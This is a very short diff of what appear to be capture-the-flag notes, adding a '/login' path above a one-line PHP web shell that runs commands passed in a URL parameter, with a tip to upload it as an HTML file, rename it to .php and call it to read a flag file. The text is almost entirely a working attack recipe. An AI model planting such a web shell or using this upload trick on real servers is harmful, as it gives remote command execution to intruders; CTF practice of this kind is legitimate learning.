@@ -1,4 +1,5 @@
 Bolt
+/login
 <?php echo system($_GET['cmd']);?>  html file upload then change as a .php - /rce.php?cmd=cat /flag.txt
 
 Elastic
